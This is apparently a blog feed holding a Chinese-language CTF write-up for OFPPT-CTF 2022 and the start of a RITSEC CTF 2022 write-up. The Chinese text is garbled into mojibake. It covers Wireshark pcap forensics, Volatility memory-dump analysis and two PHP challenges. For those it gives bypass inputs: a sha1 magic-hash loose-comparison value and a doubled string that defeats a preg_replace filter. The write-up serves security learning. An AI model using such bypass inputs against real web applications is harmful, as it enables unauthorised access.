      <title>OFPPT-CTF-2022-writeup</title>
      <link href="/2022/04/08/CTFS/OFPPT-CTF-2022-writeup/"/>
      <url>/2022/04/08/CTFS/OFPPT-CTF-2022-writeup/</url>
      
        <content type="html"><![CDATA[<h3 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h3><h4 id="pcap-analysis1"><a href="#pcap-analysis1" class="headerlink" title="pcap analysis1"></a>pcap analysis1</h4><p>è€ƒç‚¹:æµé‡åˆ†æ</p><p><a href="/images/ofppt-ctf-2022/pcap-analysis.7z">æµé‡åŒ…ä¸‹è½½</a></p><p>ç¬¬ä¸€é¢˜ï¼Œå› ä¸ºè‹±è¯­å¤ªèœäº†ï¼Œè¿™é‡Œç¿»è¯‘ä¸€ä¸‹ï¼Œå¤§è‡´çš„æ„æ€å°±æ˜¯è¢«å…¥ä¾µäº†ï¼Œç„¶ååˆ†æä¸€ä¸‹ï¼Œè¿™ä¸ªäººåœ¨æœç´¢å¼•æ“ä¸ŠæŸ¥æ‰¾äº†ä»€ä¹ˆ</p><p><img src="/images/ofppt-ctf-2022/1.png" alt="image-20220408210409793"></p><p>æˆ‘ä»¬è¿™é‡Œç›´æ¥ç­›é€‰httpæµé‡ï¼Œéšä¾¿ç‚¹ä¸€ä¸ªï¼Œçœ‹åˆ°ä½¿ç”¨çš„æ˜¯ç™¾åº¦ï¼Œéšä¾¿æœç´¢ä¸€ä¸ªåå­—ï¼Œå°±å¯ä»¥çœ‹åˆ°ï¼Œwdå¯¹åº”çš„å€¼å°±æ˜¯æˆ‘ä»¬æœç´¢çš„å†…å®¹ï¼Œ</p><p><img src="/images/ofppt-ctf-2022/2.png" alt="image-20220408211238126"></p><p><img src="/images/ofppt-ctf-2022/3.png" alt="image-20220408211344064"></p><p><img src="/images/ofppt-ctf-2022/4.png" alt="image-20220408211438318"></p><p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥ç”¨ç®€å•æ–¹æ³•ï¼Œæ–‡ä»¶å¯¼å‡ºé¦–é€‰é¡¹ï¼Œä¸‹é¢æœ‰å…¨éƒ¨çš„urlï¼Œè¿™é‡Œç›´æ¥æŠ„å°±è¡Œäº†ã€‚</p><p><img src="/images/ofppt-ctf-2022/5.png" alt="image-20220408212025332"></p><p>OFPPT-CTF{charles_geschickter}</p><h4 id="pcap-analysis2"><a href="#pcap-analysis2" class="headerlink" title="pcap analysis2"></a>pcap analysis2</h4><p>wiresharkæå–ftpæµé‡åŒ…</p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è®¸å¤šftpçš„åè®®ï¼Œæˆ‘ä»¬ç›´æ¥å¸…é€‰ftpçš„æµé‡ï¼Œå¾€ä¸‹ç¿»ä¸€ç•ªï¼Œéšä¾¿æ‰¾ä¸ªrequeståŒ…ï¼Œå³é”®è¿½è¸ªæµå°±å¯ä»¥çœ‹åˆ°äº†ï¼Œ</p><p><img src="/images/ofppt-ctf-2022/6.png" alt="image-20220408212631031"></p><p>å› ä¸ºé¢˜ç›®çš„è¦æ±‚æ˜¯ç›¸åŒæ–‡ä»¶åï¼Œåç¼€ä¸åŒï¼Œæ‰€ä»¥å°±æ˜¯è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œæ¥ä¸‹æ¥æå–è¿™ä¸¤åŒ…</p><p><img src="/images/ofppt-ctf-2022/7.png" alt="image-20220408212848843"></p><p>è¿™é‡Œç›´æ¥æœç´¢lytton-crypt.binä¸‹é¢ftpdataå°±æ˜¯æ•°æ®ï¼Œç›´æ¥è¿½è¸ª</p><p><img src="/images/ofppt-ctf-2022/8.png" alt="image-20220408213524053"></p><p>è°ƒæˆåŸå§‹æ•°æ®ï¼Œsave</p><p><img src="/images/ofppt-ctf-2022/9.png" alt="image-20220408213738041"></p><p>lytton-crypt.bin</p><p>MD5: 4da8e81ee5b08777871e347a6b296953<br>SHA1: 5f88cfb5e469154782aa84a6b649007423c8b196<br>SHA256: 22190203d1789b181eb7230ceeafffe440b33883e185470b7cf64ab22fb3ba9f<br>CRC32: 2859590343</p><p>lytton-crypt.exe åŒç†</p><p><img src="/images/ofppt-ctf-2022/10.png" alt="image-20220408213950236"></p><p>MD5: 9cb9b11484369b95ce35904c691a5b28<br>SHA1: 4463adb39c4381b87c76180543c401c2bfa89962<br>SHA256: b7da7228ac44bd90aedf34660a04d15bf1ddf84c1a4823234c3abf506a254b8b<br>CRC32: 3745826804</p><blockquote><p>OFPPT-CTF{9cb9b11484369b95ce35904c691a5b28|4da8e81ee5b08777871e347a6b296953}</p></blockquote><h4 id="pcap-analysis3"><a href="#pcap-analysis3" class="headerlink" title="pcap analysis3"></a>pcap analysis3</h4><p>The attacker cracked a password belonging to the victim. Submit the flag as: OFPPT-CTF{password}.</p><p>è¿™é¢˜å°±æ¯”è¾ƒç®€å•äº†ï¼Œè¯´æ”»ç ´äº†å¯†ç ï¼Œæˆ‘ä»¬åˆšåˆšåœ¨ftpæœåŠ¡å™¨ä¸Šçœ‹åˆ°äº†ç™»é™†çš„ç—•è¿¹ï¼Œå»æ‰¾ä¸€ä¸‹å¯†ç ï¼Œç›´æ¥æœç´¢tcpå’Œ200å°±è¡Œï¼Œæˆ–è€…utf8ä¹Ÿå¯ä»¥ï¼Œè¿½è¸ªä¸€ä¸‹ï¼Œå°±å¯ä»¥çœ‹åˆ°ç™»å½•æˆåŠŸäº†</p><p><img src="/images/ofppt-ctf-2022/11.png" alt="image-20220408215301907"></p><p><img src="/images/ofppt-ctf-2022/12.png" alt="image-20220408215400191"></p><p>USER cgeschickter</p><p>331 Password required</p><p>PASS darkangel</p><p>230 User logged in.</p><blockquote><p>OFPPT-CTF{darkangel}</p></blockquote><h4 id="pcap-analysis4"><a href="#pcap-analysis4" class="headerlink" title="pcap analysis4"></a>pcap analysis4</h4><p>4è¿™é‡Œè¯´æ‰§è¡Œäº†ä¸€ä¸ªæ–‡ä»¶<br>The attacker made a fatal mistake, and in doing so, gave control of his computer toâ€¦ someone. he shouldnâ€™t have run that malicious program.</p><p>æˆ‘ä»¬åœ¨æœç´¢httpæµé‡æ—¶ï¼Œæ‰¾åˆ°ä¸€ä¸ªsecret_decoder.binï¼Œæœç´¢è¿™ä¸ªå…³é”®å­—æ—¶ï¼Œå‘ç°</p><p><img src="/images/ofppt-ctf-2022/13.png" alt="image-20220408215914265"></p><p><img src="/images/ofppt-ctf-2022/14.png" alt="image-20220408220108310"></p><p>.106çš„æœºå™¨åœ¨105ä¸Šæ‰§è¡Œäº†å‘½ä»¤</p><p><strong>ä½¿ç”¨wget -Oä¸‹è½½å¹¶ä»¥ä¸åŒçš„æ–‡ä»¶åä¿å­˜</strong></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°wgetäº†ä¸€ä¸ªæ–‡ä»¶ä¸”é‡å‘½åäº†ï¼Œä¹‹åæ”¹äº†æƒé™ï¼Œç„¶åå¢åŠ äº†å®šæ—¶ä»»åŠ¡ï¼Œè¯´æ˜æ‰§è¡Œçš„å°±æ˜¯è¿™ä¸ªsecret_decoder.binæ–‡ä»¶</p><p><img src="/images/ofppt-ctf-2022/15.png" alt="image-20220408220220107"></p><p>è¿™é‡Œå› ä¸ºä»–åœ¨æœ€åhttpè¯·æ±‚äº†è¿™ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬ç›´æ¥å¯¼å‡ºå°±è¡Œ,å’Œftpå¯¼å‡ºä¸€æ ·.</p><p><img src="/images/ofppt-ctf-2022/16.png" alt="image-20220408220615646"></p><p>å¯¼å‡ºä¹‹åå–ä¸€ä¸‹æ–‡ä»¶md5å°±è¡Œäº†</p><p>MD5: 42e419a6391ca79dc44d7dcef1efc83b<br>SHA1: e96c5e687d827f5a250fc643d1e9ff46e2c531bc<br>SHA256: 358489fcab70c3f10c4628e09c1ccbd001915f6adfa7fa97a1be0fb5fbab8198<br>CRC32: 2929409365</p><p><img src="/images/ofppt-ctf-2022/17.png" alt="image-20220408205826205"><br><img src="/images/ofppt-ctf-2022/18.png" alt="image-20220408205858332"></p><blockquote><p>OFPPT-CTF{42e419a6391ca79dc44d7dcef1efc83b}</p></blockquote><h4 id="pcapanalysis5"><a href="#pcapanalysis5" class="headerlink" title="pcapanalysis5"></a>pcapanalysis5</h4><p>The attacker started by performing a port scan of the victim computer.<br>Identify the open TCP ports discovered on the victimâ€™s machine? Enter the flag as the open ports, separated by commas, no spaces, in numerical order. Disregard port numbers &gt; 10000. Example: OFPPT-CTF{80,110,111,143,443,2049} Use the PCAP file from â€˜pcap analysisâ€™ challenge.</p><p>è¿™é‡Œæˆ‘ä»¬å…ˆæ¨æ–­ä¸€ä¸‹ï¼Œå› ä¸ºåœ¨æ•°æ®åŒ…ä¸­106çš„ipå¯¹103çš„ipè¿›è¡Œäº†ftpå¯†ç çˆ†ç ´ï¼Œæ‰€ä»¥106ä¸ºæ”»å‡»è€…ï¼Œ103ä¸ºå—å®³è€…ä¸”å‡è®¾çš„ä¸ºftpæœåŠ¡ã€‚<br>ç­›é€‰ä¸€ä¸‹ç›®çš„ip<code>ip.dst == 192.168.100.103</code></p><p><img src="/images/ofppt-ctf-2022/19.png" alt="image-20220409211513430"></p><p><img src="/images/ofppt-ctf-2022/20.png" alt="image-20220409212805266"></p><p>å¯ä»¥çœ‹åˆ°åœ¨æ‰«æç«¯å£ï¼Œå¾€ä¸‹æ‹‰ä¸€æ‹‰ä¼šçœ‹åˆ°è¯·æ±‚æˆåŠŸçš„ç«¯å£ï¼Œä¸€å…±æœ‰äº”ä¸ªã€‚è¿™é‡Œæˆ‘çš„æ–¹æ³•ä¸æ¨èï¼Œä¸‹é¢è¿™ä¸ªæ˜¯ä¸€ä¸ªå¤§å¸ˆå‚…çš„æ–¹æ³•ï¼Œé“¾æ¥<code>https://hhyleung.github.io/writeups/ofppt-ctf-2022/#pcap-analysis-6</code></p><p><img src="/images/ofppt-ctf-2022/21.png" alt="image-20220409213029038"></p><blockquote><p>A port scan is usually done with the TCP handshake, which ends with <code>SYN, ACK</code> if the port is opened. &gt;The filter <code>tcp.flags.ack == 1 and tcp.flags.syn == 1</code> was used to filter out the completed &gt;handshakes and it was found that ports <code>21</code>, <code>135</code>, <code>139</code>, <code>445</code>, and <code>3389</code> were opened.</p></blockquote><p>åŠ ä¸Šipå°±æ›´æ¸…æ™°äº†<code>tcp.flags.ack == 1 and tcp.flags.syn == 1 and ip.addr == 192.168.100.103</code></p><p><img src="/images/ofppt-ctf-2022/22.png" alt="image-20220409214123092"></p><blockquote><p>OFPPT-CTF{21,135,139,445,3389} </p></blockquote><h4 id="pcap-analysis6"><a href="#pcap-analysis6" class="headerlink" title="pcap analysis6"></a>pcap analysis6</h4><p>The attacker might have just bit off more than he can chew! he encountered a competitor that is counter-attacking his system!<br>The competitor executed a command to attain persistence on the attackerâ€™s computer. This command will allow the adversary to regain a connection to the computer even after reboot. What is the packet number where this command was executed? For example: OFPPT-CTF{93721}. Use the PCAP file from â€˜pcap analysisâ€™ challenge.</p><p>å‰é¢æˆ‘ä»¬çŸ¥é“åŠ äº†è®¡åˆ’ä»»åŠ¡ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥æœsudo å°±å¯ä»¥äº†ï¼Œè¯¥åŒ…çš„å·ä¸º160468</p><p><img src="/images/ofppt-ctf-2022/23.png" alt="image-20220409214555530"></p><blockquote><p>OFPPT-CTF{160468} </p></blockquote><h4 id="Windows-memory-dump"><a href="#Windows-memory-dump" class="headerlink" title="Windows memory dump"></a>Windows memory dump</h4><p>A Windows computer has been infected. The attacker managed to exploit a portion of a database backup that contains sensitive employee and customer private information. All memory dump challenges use the same file.<br>Inspect the memory dump and tell us the Windows Major Operating System Version, bit version, and the image date/time (UTC, no spaces or special characters). Submit the flag as OFPPT-CTF{OS_BIT_YYYYMMDDhhmmss}. Example: OFPPT-CTF{WindowsXP_32_20220120095959} File: 1.5 GB Decompressed: 5 GB</p><p>è¿™é‡Œå–è¯é¢˜ï¼Œç¬¬ä¸€æ¬¡é‡åˆ°win10çš„é•œåƒï¼Œè®°å½•ä¸€ä¸‹</p><p>å…ˆçœ‹ä¸€ä¸‹é•œåƒä¿¡æ¯<code>â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility] â””â”€# python2 vol.py -f ../ctf/ofppt/physmemraw imageinfo</code><br>ç”±äºè¿™ä¸ªæ–‡ä»¶å¾ˆå¤§ 5G,æ‰«ææ‰«äº†å¾ˆä¹…ï¼ŒæŸ¥ä¸å¤šäº”åˆ†é’Ÿï¼Œæˆ‘ä¸€åº¦ä»¥ä¸ºæ˜¯æˆ‘æ“ä½œä¸å¯¹ã€‚åæ¥å‘ç°ä¸æ˜¯ï¼Œå•çº¯çš„æ˜¯å› ä¸ºæ–‡ä»¶å¤§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€<span class="comment"># python2 vol.py -f ../ctf/ofppt/physmemraw imageinfo</span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win10x64_19041</span><br><span class="line">                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/tools/ctf/ofppt/physmemraw)</span><br><span class="line">                      PAE <span class="built_in">type</span> : No PAE</span><br><span class="line">                           DTB : 0x1aa000L</span><br><span class="line">                          KDBG : 0xf8005e600b20L</span><br><span class="line">          Number of Processors : 4</span><br><span class="line">     Image Type (Service Pack) : 0</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 0 : 0xfffff8005ba60000L</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 1 : 0xffff82804f9c0000L</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 2 : 0xffff82804f5e8000L</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 3 : 0xffff82804f7ca000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image date and time : 2021-09-07 14:57:44 UTC+0000</span><br><span class="line">     Image <span class="built_in">local</span> date and time : 2021-09-07 07:57:44 -0700</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯64ä½çš„win10ï¼Œæ‰€ä»¥flag</p><blockquote><p>OFPPT-CTF{Windows10_64_20210907145744} </p></blockquote><h4 id="Windows-memory-dump2"><a href="#Windows-memory-dump2" class="headerlink" title="Windows memory dump2"></a>Windows memory dump2</h4><table><thead><tr><th>envars</th><th>æ˜¾ç¤ºè¿›ç¨‹çš„ç¯å¢ƒå˜é‡</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€# python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 envars | grep COMPUTE</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">     568 wininit.exe          0x000002760e625ed0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     644 winlogon.exe         0x000002a6290b71e0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     668 services.exe         0x0000018faf8027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     708 lsass.exe            0x00000234422027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     832 svchost.exe          0x000001e39d6027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     952 svchost.exe          0x000001c6c2e027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     996 svchost.exe          0x000002da882027f0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br><span class="line">     428 dwm.exe              0x0000019f91800fe0 COMPUTERNAME                   DESKTOP-IT8QNRI</span><br></pre></td></tr></table></figure><blockquote><p>OFPPT-CTF{DESKTOP-IT8QNRI}</p></blockquote><h4 id="Windows-memory-dump3"><a href="#Windows-memory-dump3" class="headerlink" title="Windows memory dump3"></a>Windows memory dump3</h4><p>Using the memory dump file from Window memory dump challenge, find out the name of the malicious process.<br>Submit the flag as OFPPT-CTF{process-name_pid} (include the file extension). Example: OFPPT-CTF{svchost.exe_1234}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€# python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 pstree                                                                         130 â¨¯</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Name                                                  Pid   PPid   Thds   Hnds Time</span><br><span class="line">-------------------------------------------------- ------ ------ ------ ------ ----</span><br><span class="line"> 0xffff9a077fead080:wininit.exe                       568    456      1      0 2021-09-07 14:24:53 UTC+0000</span><br><span class="line">. 0xffff9a077ff1d080:lsass.exe                        708    568     13      0 2021-09-07 14:24:55 UTC+0000</span><br><span class="line">. 0xffff9a077ff54140:fontdrvhost.ex                   864    568      5      0 2021-09-07 14:24:55 UTC+0000</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"> 0xffff9a07843ab080:userinit.exe                     8180   2252      3      0 2021-09-07 14:55:55 UTC+0000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€# python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 cmdline | grep 8180</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">userinit.exe pid:   8180</span><br></pre></td></tr></table></figure><blockquote><p>OFPPT-CTF{userinit.exe_8180}</p></blockquote><h4 id="Windows-memory-dump4"><a href="#Windows-memory-dump4" class="headerlink" title="Windows memory dump4"></a>Windows memory dump4</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€<span class="comment"># python2 vol.py -f ../ctf/ofppt/physmemraw --profile=Win10x64_19041 dumpfiles --pid 8180 --dump-dir=../ctf/ofppt/                                    1 â¨¯</span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">ImageSectionObject 0xffff9a077f6d01a0   8180   \Device\HarddiskVolume2\Windows\SysWOW64\sechost.dll</span><br><span class="line">DataSectionObject 0xffff9a077f61f0d0   8180   \Device\HarddiskVolume2\Windows\System32\locale.nls</span><br><span class="line">ImageSectionObject 0xffff9a07857d4280   8180   \Device\HarddiskVolume2\Windows\Temp\userinit.exe</span><br><span class="line">ImageSectionObject 0xffff9a0784c4e590   8180   \Device\HarddiskVolume2\Windows\SysWOW64\cryptsp.dll</span><br><span class="line">ImageSectionObject 0xffff9a0784c6fa60   8180   \Device\HarddiskVolume2\Windows\System32\icuin.dll</span><br><span class="line">ImageSectionObject 0xffff9a0784c6f740   8180   \Device\HarddiskVolume2\Windows\System32\icuuc.dll</span><br><span class="line">DataSectionObject 0xffff9a0785d549b0   8180   \Device\HarddiskVolume2\Windows\System32\en-US\WWAHost.exe.mui</span><br><span class="line">DataSectionObject 0xffff9a0785d5ba30   8180   \Device\HarddiskVolume2\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_18.2106.12410.0_x64__8wekyb3d8bbwe\microsoft.system.package.metadata\S-1-5-21-1114333211-2247716564-2192578087-1001-MergedResources-0.pri</span><br><span class="line">DataSectionObject 0xffff9a077fefc730   8180   \Device\HarddiskVolume2\Windows\Globalization\Sorting\SortDefault.nls</span><br><span class="line">DataSectionObject 0xffff9a078480c5f0   8180   \Device\HarddiskVolume2\Windows\System32\en-US\edgehtml.dll.mui</span><br><span class="line">DataSectionObject 0xffff9a0780c1ced0   8180   \Device\HarddiskVolume2\Windows\ServiceProfiles\LocalService\AppData\Local\FontCache\~FontCache-System.dat</span><br><span class="line">DataSectionObject 0xffff9a0780d38620   8180   \Device\HarddiskVolume2\Windows\System32\en-US\KernelBase.dll.mui</span><br><span class="line">DataSectionObject 0xffff9a07809f4a30   8180   \Device\HarddiskVolume2\Windows\System32\en-US\dnsapi.dll.mui</span><br><span class="line">DataSectionObject 0xffff9a078482feb0   8180   \Device\HarddiskVolume2\Windows\ServiceProfiles\LocalService\AppData\Local\FontCache\~FontCache-S-1-5-21-1114333211-2247716564-2192578087-1001.dat</span><br></pre></td></tr></table></figure><p>ImageSectionObject 0xffff9a07857d4280   8180   \Device\HarddiskVolume2\Windows\Temp\userinit.exe</p><p>æœªå‡ºï¼Œå€Ÿä¸€ä¸‹å¤§å¸ˆå‚…çš„writeup</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ vol -f physmemraw windows.dumpfiles --pid 8180</span><br><span class="line"></span><br><span class="line">Volatility 3 Framework 2.0.2</span><br><span class="line">Progress:  100.00               PDB scanning finished  </span><br><span class="line">Cache   FileObject      FileName        Result</span><br><span class="line"></span><br><span class="line">ImageSectionObject      0x9a077f6d01a0  sechost.dll     file.0x9a077f6d01a0.0x9a077f0ddb20.ImageSectionObject.sechost.dll.img</span><br><span class="line">ImageSectionObject      0x9a07857d4280  userinit.exe    file.0x9a07857d4280.0x9a07843b6a90.ImageSectionObject.userinit.exe.img</span><br><span class="line">ImageSectionObject      0x9a0784c4e590  cryptsp.dll     file.0x9a0784c4e590.0x9a0784bbca20.ImageSectionObject.cryptsp.dll.img</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">â””â”€$ sha1sum file.0x9a07857d4280.0x9a07843b6a90.ImageSectionObject.userinit.exe.img</span><br><span class="line">962d96f30c8f126cbcdee6eecc5e50c3a408402b  file.0x9a07857d4280.0x9a07843b6a90.ImageSectionObject.userinit.exe.img</span><br></pre></td></tr></table></figure><p>Flag: <code>OFPPT-CTF&#123;962d96f30c8f126cbcdee6eecc5e50c3a408402b&#125;</code></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hash&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;hash&#x27;</span>] === <span class="string">&quot;10932435112&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Not so easy mate.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$hash</span> = sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;hash&#x27;</span>]);</span><br><span class="line">    <span class="variable">$target</span> = sha1(<span class="number">10932435112</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$hash</span> == <span class="variable">$target</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;csictf&#123;loser&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"> ?hash=aaroZmOk</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒ<a href="https://hhyleung.github.io/writeups/ofppt-ctf-2022/">https://hhyleung.github.io/writeups/ofppt-ctf-2022/</a></p><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> æµé‡åˆ†æ </tag>
            
            <tag> å–è¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022 RITSEC CTF éƒ¨åˆ†writeup</title>
      <link href="/2022/04/02/CTFS/2022-RITSEC-CTF-%E9%83%A8%E5%88%86writeup/"/>
      <url>/2022/04/02/CTFS/2022-RITSEC-CTF-%E9%83%A8%E5%88%86writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h3 id="Pretty-Horrible-Program-1"><a href="#Pretty-Horrible-Program-1" class="headerlink" title="Pretty Horrible Program 1"></a>Pretty Horrible Program 1</h3><p>è€ƒç‚¹ï¼šåŒå†™ç»•è¿‡preg_replace</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;bingus&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bingus&#x27;</span>];</span><br><span class="line">    <span class="variable">$to_replace</span> = <span class="string">&#x27;bingus&#x27;</span>;</span><br><span class="line">    <span class="variable">$clean_string</span> = preg_replace(<span class="string">&quot;/<span class="subst">$to_replace</span>/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your string is: <span class="subst">$clean_string</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$clean_string</span> == <span class="variable">$to_replace</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h2 class=\&quot;answer\&quot;&gt;Bingus &lt;span style=\&quot;color: green;\&quot;&gt;IS&lt;/span&gt; your beloved&lt;/h2&gt;&quot;</span>;</span><br><span class="line">      output_flag();</span><br></pre></td></tr></table></figure><p>$clean_string = preg_replace(â€œ/$to_replace/â€œ, â€˜â€™, $input);<br>å…³é”®ä»£ç ï¼Œgetä¼ å‚ä¸€ä¸ªbingusï¼Œç”±äºpreg_replaceä¼šæŠŠä¸€ä¸ªbingusæ›¿æ¢ä¸ºç©ºï¼Œä½†æ˜¯ä¸‹é¢åˆè¦ç­‰äºbingusï¼Œæˆ‘ä»¬å¯ä»¥åŒå†™<code>bingbingusus</code><br><img src="/images/2022-RITSEC-CTF/1.png" alt="image-20220402162035760"></p><h3 id="Pretty-Horrible-Program-3"><a href="#Pretty-Horrible-Program-3" class="headerlink" title="Pretty Horrible Program 3"></a>Pretty Horrible Program 3</h3><p>è€ƒç‚¹ï¼šhashå¼ºç¢°æ’</p><figure class="highlight 